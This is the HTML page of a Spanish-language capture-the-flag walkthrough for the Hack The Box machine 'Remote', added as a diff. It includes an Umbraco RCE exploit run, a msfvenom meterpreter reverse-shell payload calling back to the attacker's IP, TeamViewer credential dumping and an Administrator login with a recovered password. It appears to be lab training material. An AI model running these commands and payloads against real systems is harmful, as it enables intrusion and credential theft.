@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=600cce79d1f7c8e1e27db008a5f11afea0954d82">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>REMOTE HTB | (Impacket, monturas, escalada mediante TeamViewer)</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="REMOTE HTB" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="(Impacket, monturas, escalada mediante TeamViewer)" />
+<meta property="og:description" content="(Impacket, monturas, escalada mediante TeamViewer)" />
+<link rel="canonical" href="http://localhost:4000/m%C3%A1quinas/remote/" />
+<meta property="og:url" content="http://localhost:4000/m%C3%A1quinas/remote/" />
+<meta property="og:site_name" content="REMOTE HTB" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="REMOTE HTB" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"(Impacket, monturas, escalada mediante TeamViewer)","headline":"REMOTE HTB","url":"http://localhost:4000/m%C3%A1quinas/remote/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>REMOTE HTB</h1>
+        </a>
+        <h2>(Impacket, monturas, escalada mediante TeamViewer)</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/samucrow/samucrow.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>Empezaremos haciendo el nmap de siempre:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sCV</span> <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> 10.10.10.180 <span class="nt">-oN</span> escaneo_nmap
+
+</code></pre></div></div>
+
+<p>Y nos encontrará un montón de puertos abiertos, vemos 2 que nos interesan a primera vista.</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203203247.png" alt="image" /></p>
+
+<p>Si probamos a entrar en ftp como Anonymous no nos encuentra nada dentro de ftp:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203203401.png" alt="image" /></p>
+
+<p>Vamos a entrar en el puerto 80 (la web), inspeccionamos un poco pero no vemos nada interesante, vamos a hacer un wfuzz para encontrar subdirectorios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-u</span> <span class="s1">'http://10.10.10.180/FUZZ'</span>
+
+</code></pre></div></div>
+
+<p>Con estos parámetros nos encuentra un montón de subdirectorios, pero si inspeccionamos un poco vemos que nos aparece uno que se llama “install”, que si nos metemos desde la web nos hace un redirect a esta página:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203203911.png" alt="image" /></p>
+
+<p>Una vez en esta página vemos que hay un panel de login, pero no parece que haya forma de entrar de momento. Si <strong>volvemos sobre nuestros pasos</strong> y nos vamos al escaneo de nmap que hicimos antes nos damos cuenta que el siguiente puerto de nfs está abierto:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203204430.png" alt="image" /></p>
+
+<p>En este puerto se están emitiendo una ubicación por la red (una montura), con el comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+showmount <span class="nt">-e</span> <span class="s2">"10.10.10.180"</span>
+
+</code></pre></div></div>
+
+<p>podemos ver las monturas que está emitiendo esa ip:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203204727.png" alt="image" /></p>
+
+<p>Aunque también podemos hacerlo con nmap mediante el comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+nmap <span class="nt">-p</span> 111 <span class="nt">--script</span><span class="o">=</span>nfs-showmount <span class="s2">"10.10.10.180"</span>
+
+</code></pre></div></div>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203204842.png" alt="image" /></p>
+
+<p>Una vez en este punto, podemos montar en local esa montura con el comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+mount <span class="nt">-t</span> nfs 10.10.10.180:/site_backups /mnt/
+
+</code></pre></div></div>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205218.png" alt="image" /></p>
+
+<p>Si vamos al directorio App_Data vemos que hay un archivo .sdf llamado <em>Umbraco.sdf</em>, donde vienen datos en binario. Hay mucha información, así que vamos a poner el comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nb">cat </span>Umbraco.sdf | <span class="nb">head</span>
+
+</code></pre></div></div>
+
+<p>para que nos ponga en pantalla solo las primeras líneas de este archivo, en las que vemos un hash de la contraseña de admin:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205630.png" alt="image" /></p>
+
+<p>Si nos vamos a la web de https://crackstation.net la crackeamos fácil:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205736.png" alt="image" /></p>
+
+<p>También tenemos el usuario de la web del admin, el login donde pedía un correo:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203205810.png" alt="image" /></p>
+
+<p>Si nos vamos a la web y probamos con estas credenciales entramos a la web, que si nos vamos a la esquina de arriba a la izquierda, donde nuestro usuario admin, tendríamos la versión de <em>Umbraco</em>:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203210018.png" alt="image" /></p>
+
+<p>Si buscamos un exploit por GitHub, nos encontramos con la web https://github.com/Jonoans/Umbraco-RCE/, donde hay que clonar el repositorio. Una vez clonado e instalados los requirements, ejecutamos el ejecutable .py (exploit.py) de la siguiente manera</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+python3 exploit.py <span class="nt">-u</span> admin@htb.local <span class="nt">-p</span> baconandcheese <span class="nt">-w</span> http://10.10.10.180 <span class="nt">-i</span> 10.10.14.20
+
+</code></pre></div></div>
+
+<p>Una vez puesto este comando, nos da una shell directamente:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203213041.png" alt="image" /></p>
+
+<p>El problema es que si probamos a poner comandos básicos no funciona bien.</p>
+
+<p>Lo primero que haremos es irnos a un directorio donde tengamos más permisos, como por ejemplo <em>temp</em>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\windows\temp</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Una vez aquí, nos vamos a compartir un archivo malicioso hecho mediante msfvenom para poder conseguir una shell mejor. Vamos a crear el archivo con el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.20 <span class="nv">LPORT</span><span class="o">=</span>5555 <span class="nt">-f</span> exe <span class="nt">-o</span>  virus.exe
+
+</code></pre></div></div>
+
+<p>Mediante este comando estamos creando un archivo malicioso .exe, al que le estamos metiendo un payload de una meterpreter de windows, especificando el puerto y nuestra ip. Una vez creado, lo vamos a compartir con la máquina víctima mediante impacket. Con el siguiente comando crearemos un recurso compartido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+impacket-smbserver samucrow <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+
+</code></pre></div></div>
+
+<p>Esto básicamente es como hacer un</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span>
+
+</code></pre></div></div>
+
+<p>pero para windows funciona mejor impacket.</p>
+
+<p>Una vez iniciado el servidor para compartir archivos, nos vamos a copiar el .exe malicioso a la máquina víctima de la siguiente manera:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="n">copy</span><span class="w"> </span><span class="nx">\\10.10.14.20\samucrow\virus.exe</span><span class="w"> </span><span class="nx">virus.exe</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Una vez tenemos el virus dentro del sistema víctima, nos vamos a metasploit usando msfconsole para usar multi/handler:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203215628.png" alt="image" /></p>
+
+<p>con el comando</p>
+
+<pre><code class="language-msfconsole">
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+</code></pre>
+
+<p>vamos a definir el mismo payload que pusimos en el .exe que copiamos en la máquina víctima para conseguir una meterpreter. Vamos a poner los datos que nos piden de nuestra ip, tanto en el payload como en el multi/handler, y vamos a poner también el puerto 5555 en ambos, que es el que especificamos anteriormente en el payload también:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203220118.png" alt="image" /></p>
+
+<p>ponemos el comando run y ejecutamos el virus.exe en la máquina víctima poniendo <code class="language-plaintext highlighter-rouge">./virus.exe</code>, lo que nos dará una meterpreter:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203220355.png" alt="image" /></p>
+
+<p>Una vez en la meterpreter, ponemos <code class="language-plaintext highlighter-rouge">shell</code> y nos dará una shell de windows:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203221312.png" alt="image" /></p>
+
+<p>ahora iremos a C:\Users\Public\ para ver la flag de user:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203221719.png" alt="image" /></p>
+
+<h1 id="escalada-1">Escalada 1</h1>
+
+<p>Ahora si nos vamos a la ruta “<em>C:\Program Files (x86)</em>”, vemos que esta máquina tiene <em>TeamViewer</em>, por lo que vamos a usar un módulo de metasploit que nos permite enumerar este programa.</p>
+
+<p>Pondremos el comando <code class="language-plaintext highlighter-rouge">background</code> en la meterpreter (primero hay que hacer <code class="language-plaintext highlighter-rouge">exit</code>), ahora vamos a buscar lo siguiente:</p>
+
+<pre><code class="language-msfconsole">
+search teamviewer
+
+</code></pre>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203223006.png" alt="image" /></p>
+
+<p>elegimos al opción “1” y si ponemos <code class="language-plaintext highlighter-rouge">show options</code> vemos que nos pide un SESSION, por lo que listamos las sesiones activas con <code class="language-plaintext highlighter-rouge">session -l</code>:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203223209.png" alt="image" /></p>
+
+<p>elegimos la opción “1” y ponemos <code class="language-plaintext highlighter-rouge">run</code> y nos encontrará la contraseña de TeamViewer:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203223318.png" alt="image" /></p>
+
+<p>Para deducir de que usuario es esta contraseña, vamos otra vez a la shell de meterpreter con <code class="language-plaintext highlighter-rouge">session -i 1</code> y vamos a la ruta “<em>C:\users</em>”, donde veremos  que solo existe el usuario <strong>Administrador</strong>.</p>
+
+<p>Ahora con <code class="language-plaintext highlighter-rouge">evil-winrm</code> vamos a entrar en la máquina como Administrador:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+evil-winrm <span class="nt">-i</span> 10.10.10.180 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'!R3m0te!'</span>
+
+</code></pre></div></div>
+
+<p>Ahora nos iríamos al escritorio del Administrador y tendremos la flag de root:</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203224126.png" alt="image" /></p>
+
+<h1 id="escalada-2-no-funcional">Escalada 2 (NO FUNCIONAL)</h1>
+
+<p>Si nos vamos a la consola de metasploit, podemos poner el comando <code class="language-plaintext highlighter-rouge">search local_exploit_suggester</code> y <code class="language-plaintext highlighter-rouge">use 0</code> para usar el exploit suggester, una vez hecho esto, ponemos <code class="language-plaintext highlighter-rouge">set SESSION 1</code> y <code class="language-plaintext highlighter-rouge">run</code>, así nos buscará posibles formas de conseguir privilegios de Administrador.</p>
+
+<p><img src="/m%C3%A1quinas/remote/assets/zimages/Pasted_image_20231203224957.png" alt="image" /></p>
+
+<p>Probamos con todos los posibles exploits pero ninguno funciona</p>
+
+      </section>
+    </div>
+  </body>
+</html>
